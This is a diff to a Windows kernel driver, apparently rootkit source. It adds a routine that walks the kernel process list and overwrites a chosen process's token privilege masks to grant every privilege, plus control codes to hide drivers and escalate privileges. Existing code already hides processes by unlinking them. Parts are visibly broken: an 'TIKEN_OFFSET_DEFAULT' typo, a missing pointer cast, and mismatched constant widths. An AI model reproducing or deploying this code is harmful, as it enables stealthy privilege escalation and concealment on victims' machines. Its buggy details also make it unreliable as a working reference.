@@ -28,6 +28,100 @@ KIRQL RaiseIRQL()
 	return prev;
 }
 
+int getPID(BYTE* currentPEP)
+{
+	int* pid;
+	pid = (int *)(currentPEP + EPROCESS_OFFSET_PID);
+	return *pid;
+}
+
+BYTE* getNextPEP(BYTE* currentPEP)
+{
+	BYTE* nextPEP = NULL;
+	BYTE* fLink = NULL;
+	LIST_ENTRY listEntry;
+
+	listEntry = *((LIST_ENTRY*)(currentPEP + EPROCESS_OFFSET_LINKS));
+	fLink = (BYTE*)(listEntry.Flink);
+	nextPEP = (fLink - EPROCESS_OFFSET_LINKS);
+	return nextPEP;
+}
+
+void processToken(BYTE* currentPEP)
+{
+	UCHAR* token_address;
+	UCHAR* address;
+	DWORD addressWORD;
+
+	unsigned __int64 *bigP;
+	
+	address = (currentPEP + EPROCESS_OFFSET_TOKEN);
+
+	addressWORD = *((DWORD*)address);
+	addressWORD = addressWORD & 0xfffffff8;
+	token_address = (BYTE*)addressWORD;
+
+	bigP = (unsigned __int64*)(token_address + TOKEN_OFFSET_PRIV);
+	*bigP = 0xffffffffffffffff;
+	bigP = (unsigned __int64*)(token_address + TOKEN_OFFSET_ENABLED);
+	*bigP = 0xfffffffffffffff;
+	bigP = (unsigned __int64)(token_address + TIKEN_OFFSET_DEFAULT);
+	*bigP = 0xffffffffffffffff;
+	return;
+}
+
+void ScanTaskList(DWORD pid)
+{
+	BYTE* currentPEP = NULL;
+	BYTE* nextPEP = NULL;
+	int currentPID = 0;
+	int startPID = 0;
+	BYTE name[SZ_EPROCESS_NAME];
+
+	int fuse = 0;
+	const int BLOWN = 4096;
+
+	currentPEP = (BYTE*)PsGetCurrentProcess();
+	currentPID = getPID(currentPEP);
+
+	startPID = currentPID;
+	if (currentPID == pid) {
+		processToken(currentPEP);
+		return;
+	}
+
+	nextPEP = getNextPEP(currentPEP);
+	currentPEP = nextPEP;
+	currentPID = getPID(currentPEP);
+
+	while (startPID != currentPID) {
+		if (currentPID == pid) {
+			processToken(currentPEP);
+			return;
+		}
+
+		nextPEP = getNextPEP(currentPEP);
+		currentPEP = nextPEP;
+		currentPID = getPID(currentPEP);
+		fuse++;
+		if (fuse == BLOWN) { return; }
+	}
+	return;
+}
+
+void ModifyToken(DWORD* pid)
+{
+	KIRQL irql;
+	PKDPC dpcPtr;
+
+	irql = RaiseIRQL();
+
+	ScanTaskList(*pid);
+
+	LowerIRQL(irql);
+	return;
+}
+
 void removeDriver(DRIVER_SECTION* currentDS)
 {
 	LIST_ENTRY* prevDS;
@@ -168,13 +262,6 @@ void checkOSVersion()
 	return;
 }
 
-int getPID(BYTE* currentPEP)
-{
-	int* pid;
-	pid = (int *)(currentPEP + EPROCESS_OFFSET_PID);
-	return *pid;
-}
-
 void getTaskName(char* dest, char* src)
 {
 	strncpy(dest, src, SZ_EPROCESS_NAME);
@@ -193,18 +280,6 @@ UCHAR* getPreviousPEP(BYTE* currentPEP)
 	prevPEP = (bLink - EPROCESS_OFFSET_LINKS);
 	
 	return prevPEP;
-}
-
-BYTE* getNextPEP(BYTE* currentPEP)
-{
-	BYTE* nextPEP = NULL;
-	BYTE* fLink = NULL;
-	LIST_ENTRY listEntry;
-
-	listEntry = *((LIST_ENTRY*)(currentPEP + EPROCESS_OFFSET_LINKS));
-	fLink = (BYTE*)(listEntry.Flink);
-	nextPEP = (fLink - EPROCESS_OFFSET_LINKS);
-	return nextPEP;
 }
 
 void modifyTaskListEntry(BYTE* currentPEP)
@@ -400,6 +475,30 @@ NTSTATUS dispatchIOControl
 		}
 		pid = (DWORD*)inputBuffer;
 		HideTask(pid);
+	}
+	break;
+
+	case IOCTL_TEST_HIDEDRIVER:
+	{
+		BYTE* driverName;
+		if (inBufferLength < 0 || inputBuffer == NULL) {
+			((*IRP).IoStatus).Status = STATUS_INVALID_BUFFER_SIZE;
+			break;
+		}
+		driverName = (BYTE*)inputBuffer;
+		HideDriver(driverName);
+	}
+	break;
+
+	case IOCTL_TEST_MODIFYTOOKEN:
+	{
+		DWORD* pid;
+		if (inBufferLength < sizeof(DWORD) || inputBuffer == NULL) {
+			((*IRP).IoStatus).Status = STATUS_INVALID_BUFFER_SIZE;
+			break;
+		}
+		pid = (DWORD*)inputBuffer;
+		ModifyToken(pid);
 	}
 	break;
 
